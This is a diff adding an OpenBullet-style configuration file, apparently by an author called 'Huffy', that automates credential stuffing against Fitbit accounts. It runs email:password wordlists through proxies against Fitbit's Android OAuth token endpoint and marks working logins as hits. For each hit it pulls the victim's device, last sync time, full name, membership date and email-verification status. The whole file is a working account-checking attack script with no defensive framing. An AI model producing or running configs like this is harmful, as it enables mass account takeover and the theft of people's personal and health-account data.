@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Fitbit_Huffy",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-02T05:05:31.4959662+08:00",
+  "AdditionalInfo": "",
+  "Author": "Huffy",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://android-api.fitbit.com/oauth2/token" 
+  CONTENT "grant_type=password&client_id=2295XJ&username=<USER>&password=<PASS>&scope=activity%20heartrate%20location%20nutrition%20profile%20settings%20sleep%20social%20weight&expires_in=31536000" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: NativeHost" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+PARSE "<SOURCE>" LR "user_id\":\"" "\"" -> VAR "userid" 
+PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "token" 
+REQUEST GET "https://android-api.fitbit.com/1/user/<userid>/devices.json?https://android-api.fitbit.com/1/user/<userid>/devices.json" 
+  
+  HEADER "User-Agent: NativeHost" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <token>" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+PARSE "<SOURCE>" LR "deviceVersion\":\"" "\",\"" -> CAP "Device Name" 
+PARSE "<SOURCE>" LR "lastSyncTime\":\"" "T" -> CAP "Last Synced on" 
+REQUEST GET "https://android-api.fitbit.com/1/user/<userid>/profile.json?https://android-api.fitbit.com/1/user/<userid>/profile.json" 
+  
+  HEADER "User-Agent: NativeHost" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <token>" 
+PARSE "<SOURCE>" LR "fullName\":\"" "\"," -> CAP "Name" 
+PARSE "<SOURCE>" LR "memberSince\":\"" "\",\"" -> CAP "Member Since" 
+PARSE "<SOURCE>" LR "emailVerificationRequired\":" ",\"" -> VAR "email" 
+FUNCTION Translate 
+  KEY "false" VALUE "True" 
+  KEY "true" VALUE "False" 
+  "<email>" -> CAP "Email Verified" 
